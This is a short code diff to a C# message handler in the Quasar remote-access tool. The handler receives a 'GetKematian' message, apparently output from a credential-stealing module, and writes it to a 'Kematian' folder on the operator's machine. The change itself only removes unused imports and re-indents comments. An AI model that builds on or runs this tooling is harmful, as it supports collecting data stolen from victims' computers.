@@ -1,15 +1,10 @@
-﻿using Quasar.Common.Helpers;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
+﻿using Quasar.Common.Messages;
+using Quasar.Common.Messages.Monitoring.Kematian;
 using Quasar.Common.Networking;
-using Quasar.Server.Models;
 using Quasar.Server.Networking;
 using System;
 using System.IO;
-using System.IO.Compression;
 using System.Windows.Forms;
-using System.Diagnostics;
-using Quasar.Common.Messages.Monitoring.Kematian;
 
 namespace Quasar.Server.Messages
 {
@@ -35,9 +30,9 @@ namespace Quasar.Server.Messages
             if (message is GetKematian zipMessage)
             {
 
-                        //public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = (!FileHelper.HasIllegalCharacters(UserAtPc))
-                        //                       ? Path.Combine(Application.StartupPath, $"Clients\\{UserAtPc}_{Id.Substring(0, 7)}\\")
-                        //                       : Path.Combine(Application.StartupPath, $"Clients\\{Id}\\"));
+                //public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = (!FileHelper.HasIllegalCharacters(UserAtPc))
+                //                       ? Path.Combine(Application.StartupPath, $"Clients\\{UserAtPc}_{Id.Substring(0, 7)}\\")
+                //                       : Path.Combine(Application.StartupPath, $"Clients\\{Id}\\"));
                 string outPath = Path.Combine(Application.StartupPath, "Kematian");
 
                 if (!Directory.Exists(outPath))
